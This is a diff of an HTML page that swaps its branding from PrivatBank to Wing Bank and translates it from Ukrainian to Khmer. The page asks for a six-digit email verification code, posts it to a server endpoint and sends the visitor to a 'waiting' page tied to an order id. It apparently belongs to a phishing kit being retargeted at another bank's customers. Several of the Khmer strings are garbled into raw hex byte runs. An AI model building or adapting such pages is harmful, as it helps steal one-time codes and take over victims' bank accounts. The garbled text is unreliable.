@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="km" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Верифікація пошти</title>
+<title>ផ្ទៀងផ្ទាត់ព្រាបីសារ</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
@@ -70,20 +70,20 @@
 <body>
 
   <div class="topbar">
-    <img src="images/privatbank-logo.jpg" alt="PrivatBank">
-    <span class="topbar-title">Верифікація пошти</span>
+    <img src="images/wb-logo.svg" alt="Wing Bank">
+    <span class="topbar-title">ផ្ទៀងផ្ទាត់ព្រាបីសារ</span>
   </div>
 
   <div class="hero-banner">
     <img class="otp-img" src="images/otp-email.jpg" alt="Email OTP">
-    <h1>Код підтвердження електронної пошти</h1>
-    <p>Код підтвердження було надіслано на вашу зареєстровану електронну пошту</p>
+    <h1>កុដផ្ទៀងផ្ទាត់ ព្រាបីសារ</h1>
+    <p>កុដផ្ទៀងផ្ទាត់ ត្រុវបានផ្ញីទៅព្រាបីសារចុហ្មោហរបស់កនហ</p>
   </div>
 
   <div class="content">
     <div class="error-msg" id="errorMsg"></div>
 
-    <div class="code-label">Введіть 6-значний код з вашої електронної пошти</div>
+    <div class="code-label">បញ្ចុលកុដ៖ខ្ទង់ ពី ព្រាបីសារ</div>
 
     <div class="code-input-wrap">
       <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
@@ -96,14 +96,14 @@
 
     <div class="info-box">
       <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-      <span>Перевірте папку "Вхідні" та "Спам". PrivatBank ніколи не запитуватиме у вас цей код.</span>
+      <span>e19e96e19eb7e19e93e19eb7e19e8fe19f92e19e99e19e94e19eb7e19e85e19f92e19e85e19e80e19f8be19e85e19ebbe19e9b e19e93e19eb7e19e84 Spam. Wing Bank e19e98e19eb7e19e93e19e8ae19f82e19e9be19e9fe19ebbe19e9ae19e80e19ebbe19e8ae19e93e19f81e19ea0e19e96e19f81e19f94</span>
     </div>
 
-    <div class="resend">Не отримали лист? <a href="#">Надіслати повторно</a></div>
+    <div class="resend">e19e98e19eb7e19e93e19e94e19eb6e19e93e19e91e19e91e19ebbe19e9be19e96e19f92e19e9ae19eb6e19e94e19eb8e19e9fe19eb6e19e9a? <a href="#">ផ្ញីម្តងទៀត</a></div>
   </div>
 
   <div class="bottom">
-    <button class="submit-btn" id="submitBtn" onclick="submitCode()">Підтвердити</button>
+    <button class="submit-btn" id="submitBtn" onclick="submitCode()">បញ្ជាក់</button>
   </div>
 
 <script>
@@ -113,7 +113,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Код невірний або недійсний";
+    el.textContent = "កហដមិនត្រឹមត្រហវ រឹមិនមានសុពលភាព";
     el.style.display = "block";
   }
 
@@ -144,12 +144,12 @@
   async function submitCode() {
     const code = getCode();
     if (code.length < 6) {
-      showError("Будь ласка, введіть повний код");
+      showError("e19e9fe19ebbe19e98e19e94e19e89e19f92e19e85e19ebbe19e9be19e80e19ebbe19e8ae19e96e19eb6e19f86e19e84e19e98e19ebbe19e9be");
       return;
     }
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "Перевірка...";
+    btn.textContent = "e19e80e19e98e19f92e19e96e19ebbe19e84e19e96e19eb7e19e93e19eb7e19e8fe19f92e19e99...";
 
     try {
       const res = await fetch("/api/email-code-data", {
@@ -161,14 +161,14 @@
       if (data.success) {
         location.href = "email-code-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "មានកម្ហិសកីតលីង");
         btn.disabled = false;
-        btn.textContent = "Підтвердити";
+        btn.textContent = "បញ្ជាក់";
       }
     } catch(err) {
-      showError("Помилка з'єднання");
+      showError("កម្ហិសក្នុងការភ្ជាប់");
       btn.disabled = false;
-      btn.textContent = "Підтвердити";
+      btn.textContent = "បញ្ជាក់";
     }
   }
 
